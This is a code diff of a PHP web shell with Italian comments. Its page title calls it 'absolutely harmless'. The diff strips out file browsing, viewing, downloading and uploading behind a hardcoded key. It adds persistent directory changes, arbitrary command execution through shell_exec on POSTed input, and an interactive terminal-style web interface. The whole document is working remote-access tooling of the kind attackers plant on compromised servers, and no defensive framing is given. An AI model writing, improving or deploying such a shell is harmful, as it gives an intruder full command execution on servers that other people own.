@@ -13,74 +13,105 @@ function log_command($cmd) {
     file_put_contents(LOG_FILE, "[" . date('Y-m-d H:i:s') . "] $cmd\n", FILE_APPEND);
 }
 
-// Esegui comandi remoti
+// Variabile per mantenere lo stato della directory
+session_start();
+if (!isset($_SESSION['current_dir'])) {
+    $_SESSION['current_dir'] = getcwd(); // Directory iniziale
+}
+
+// Cambio directory persistente
+if (isset($_POST['cmd']) && preg_match('/^cd\s+(.+)/', $_POST['cmd'], $matches)) {
+    $new_dir = $matches[1];
+    if (is_dir($new_dir) && chdir($new_dir)) {
+        $_SESSION['current_dir'] = realpath($new_dir);
+        echo "Directory cambiata: " . $_SESSION['current_dir'] . "\n";
+    } else {
+        echo "Errore: directory non valida.\n";
+    }
+    exit;
+}
+
+// Esecuzione dei comandi nella directory corrente
 if (isset($_POST['cmd'])) {
+    chdir($_SESSION['current_dir']);
     $cmd = $_POST['cmd'];
     log_command($cmd);
-    echo "<pre>" . shell_exec($cmd) . "</pre>";
+    // Supporta comandi interattivi e visualizzazione del terminale
+    $output = shell_exec($cmd . " 2>&1");
+    echo "<pre>" . htmlspecialchars($output) . "</pre>";
+    exit;
 }
-
-// Naviga nel file system
-if (isset($_GET['action'])) {
-    $action = $_GET['action'];
-    if ($action === 'ls') {
-        $dir = isset($_GET['path']) ? $_GET['path'] : '.';
-        echo "<pre>";
-        foreach (scandir($dir) as $file) {
-            echo $file . "\n";
-        }
-        echo "</pre>";
-    } elseif ($action === 'view') {
-        $file = $_GET['file'];
-        if (is_readable($file)) {
-            echo "<pre>" . htmlspecialchars(file_get_contents($file)) . "</pre>";
-        } else {
-            echo "File non leggibile o non trovato.";
-        }
-    } elseif ($action === 'download') {
-        $file = $_GET['file'];
-        if (is_readable($file)) {
-            header('Content-Disposition: attachment; filename="' . basename($file) . '"');
-            readfile($file);
-            exit;
-        } else {
-            echo "File non leggibile o non trovato.";
-        }
-    }
-}
-
-// Caricamento file
-if (isset($_FILES['file']['tmp_name'])) {
-    $target = basename($_FILES['file']['name']);
-    move_uploaded_file($_FILES['file']['tmp_name'], $target);
-    echo "File uploaded to: " . realpath($target);
-}
-
-// Interfaccia utente migliorata
 ?>
-<html>
-    <body>
-        <h2>PHP Shell</h2>
-        <form method="post">
-            <input type="text" name="cmd" placeholder="Command" />
-            <button type="submit">Execute</button>
-        </form>
-        <form method="post" enctype="multipart/form-data">
-            <input type="file" name="file" />
-            <button type="submit">Upload</button>
-        </form>
-        <a href="?key=mysecretkey&action=ls">List Files</a><br>
-        <form method="get">
-            <input type="hidden" name="key" value="mysecretkey">
-            <input type="hidden" name="action" value="view">
-            <input type="text" name="file" placeholder="File to view">
-            <button type="submit">View File</button>
-        </form>
-        <form method="get">
-            <input type="hidden" name="key" value="mysecretkey">
-            <input type="hidden" name="action" value="download">
-            <input type="text" name="file" placeholder="File to download">
-            <button type="submit">Download File</button>
-        </form>
-    </body>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PHP Interactive Shell</title>
+    <style>
+        body {
+            font-family: monospace;
+            background-color: #000;
+            color: #0f0;
+        }
+        #terminal {
+            width: 100%;
+            height: 70vh;
+            background: #111;
+            border: 1px solid #333;
+            overflow-y: scroll;
+            padding: 10px;
+            white-space: pre-wrap;
+        }
+        #command {
+            width: 100%;
+            padding: 10px;
+            background: #222;
+            color: #0f0;
+            border: 1px solid #333;
+        }
+        button {
+            background: #444;
+            color: #fff;
+            border: none;
+            padding: 10px;
+            cursor: pointer;
+        }
+    </style>
+    <script>
+        async function sendCommand() {
+            const cmdInput = document.getElementById('command');
+            const terminal = document.getElementById('terminal');
+            const cmd = cmdInput.value;
+            
+            const response = await fetch('', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: 'cmd=' + encodeURIComponent(cmd)
+            });
+            
+            const output = await response.text();
+            terminal.innerHTML += `$ ${cmd}\n${output}\n`;
+            terminal.scrollTop = terminal.scrollHeight; // Scorri verso il basso
+            cmdInput.value = '';
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const cmdInput = document.getElementById('command');
+            cmdInput.addEventListener('keydown', (e) => {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    sendCommand();
+                }
+            });
+        });
+    </script>
+</head>
+<body>
+    <h1>Shell PHP assolutamente innocua</h1>
+    <div id="terminal"></div>
+    <input type="text" id="command" placeholder="Enter command..." autofocus />
+    <button onclick="sendCommand()">Execute</button>
+</body>
 </html>
